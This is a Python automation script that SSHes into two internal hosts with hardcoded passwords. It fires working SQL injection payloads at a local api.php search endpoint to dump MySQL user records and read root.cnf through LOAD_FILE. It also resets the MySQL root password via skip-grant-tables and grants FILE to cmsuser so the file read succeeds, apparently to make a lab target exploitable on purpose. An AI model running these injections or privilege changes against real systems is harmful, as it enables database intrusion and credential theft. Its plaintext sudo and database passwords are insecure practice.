#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Fix MySQL root access on A2, then grant FILE to cmsuser"""
import paramiko
import sys

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

user = 'gdadmin'
pwd = 'Gdadmin@123'

def run(ssh, cmd, timeout=30):
    print(f">>> {cmd[:180]}")
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode('utf-8', errors='replace')
    err = stderr.read().decode('utf-8', errors='replace')
    ec = stdout.channel.recv_exit_status()
    if out.strip():
        try:
            print(f"  {out.strip()[:2000]}")
        except:
            print(f"  [output {len(out.strip())} chars]")
    if err.strip() and ec != 0:
        try:
            print(f"  [err] {err.strip()[:300]}")
        except:
            print(f"  [err suppressed]")
    return out, err, ec

c2 = paramiko.SSHClient()
c2.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c2.connect('192.168.100.2', username=user, password=pwd, timeout=10)

# ============================================================
# 1. Check MySQL root auth plugin via SQLi
# ============================================================
print("="*60)
print("1. CHECK MYSQL ROOT AUTH PLUGIN (via SQLi)")
print("="*60)
c1 = paramiko.SSHClient()
c1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c1.connect('192.168.100.1', username=user, password=pwd, timeout=10)

payload = "test%27%20UNION%20SELECT%201,GROUP_CONCAT(user,':',host,':',plugin),3,4%20FROM%20mysql.user%23"
run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload}' 2>&1")

c1.close()

# ============================================================
# 2. Try different methods to connect as MySQL root
# ============================================================
print("\n" + "="*60)
print("2. TRY CONNECTING AS MYSQL ROOT")
print("="*60)

# Method 1: Use --defaults-extra-file or --defaults-file with root.cnf
run(c2, "echo 'Gdadmin@123' | sudo -S mysql --defaults-file=/etc/mysql/mysql.conf.d/root.cnf -e 'SELECT \"OK\" as result;' 2>&1")

# Method 2: Try the password directly with proper escaping
run(c2, "echo 'Gdadmin@123' | sudo -S mysql -u root --password=R00t@Mysql#2024 -e 'SELECT 1;' 2>&1")

# Method 3: Use mysql with --init-command
run(c2, "echo 'Gdadmin@123' | sudo -S mysql -u root -pR00t@Mysql -e 'SELECT 1;' 2>&1")

# Method 4: Stop mysql, restart with skip-grant-tables
print("\n--- Method 4: skip-grant-tables recovery ---")
run(c2, "echo 'Gdadmin@123' | sudo -S systemctl stop mysql 2>&1")
run(c2, "echo 'Gdadmin@123' | sudo -S mkdir -p /var/run/mysqld 2>&1")
run(c2, "echo 'Gdadmin@123' | sudo -S chown mysql:mysql /var/run/mysqld 2>&1")
run(c2, "echo 'Gdadmin@123' | sudo -S mysqld_safe --skip-grant-tables --skip-networking &", timeout=5)
run(c2, "sleep 3; echo 'Gdadmin@123' | sudo -S mysql -e \"FLUSH PRIVILEGES; ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'R00t@Mysql#2024';\" 2>&1")

# Kill the temp mysqld
run(c2, "echo 'Gdadmin@123' | sudo -S killall mysqld 2>&1; sleep 2; echo KILLED")
# Restart normally
run(c2, "echo 'Gdadmin@123' | sudo -S systemctl start mysql 2>&1; echo RESTARTED")

# ============================================================
# 3. Test root access after recovery
# ============================================================
print("\n" + "="*60)
print("3. TEST ROOT ACCESS AFTER RECOVERY")
print("="*60)
run(c2, "sleep 3; echo OK")
run(c2, "echo 'Gdadmin@123' | sudo -S mysql -u root -p'R00t@Mysql#2024' -e 'SELECT 1 AS result;' 2>&1")

# ============================================================
# 4. Grant FILE privilege to cmsuser
# ============================================================
print("\n" + "="*60)
print("4. GRANT FILE TO CMSUSER")
print("="*60)
run(c2, "echo 'Gdadmin@123' | sudo -S mysql -u root -p'R00t@Mysql#2024' -e \"GRANT FILE ON *.* TO 'cmsuser'@'%';\" 2>&1")
run(c2, "echo 'Gdadmin@123' | sudo -S mysql -u root -p'R00t@Mysql#2024' -e \"GRANT FILE ON *.* TO 'cmsuser'@'localhost';\" 2>&1")
run(c2, "echo 'Gdadmin@123' | sudo -S mysql -u root -p'R00t@Mysql#2024' -e \"FLUSH PRIVILEGES;\" 2>&1")

# Verify
run(c2, "echo 'Gdadmin@123' | sudo -S mysql -u root -p'R00t@Mysql#2024' -e \"SHOW GRANTS FOR 'cmsuser'@'%';\" 2>&1")

# ============================================================
# 5. Final LOAD_FILE test via SQLi
# ============================================================
print("\n" + "="*60)
print("5. FINAL LOAD_FILE TEST")
print("="*60)
c1 = paramiko.SSHClient()
c1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c1.connect('192.168.100.1', username=user, password=pwd, timeout=10)

import codecs
path = '/etc/mysql/mysql.conf.d/root.cnf'
hex_path = '0x' + codecs.encode(path.encode(), 'hex').decode()
payload = f"test%27%20UNION%20SELECT%201,LOAD_FILE({hex_path}),3,4%23"
run(c1, f"curl -s 'http://localhost/api.php/search?keyword={payload}' 2>&1")

c1.close()
c2.close()
print("\nDone!")
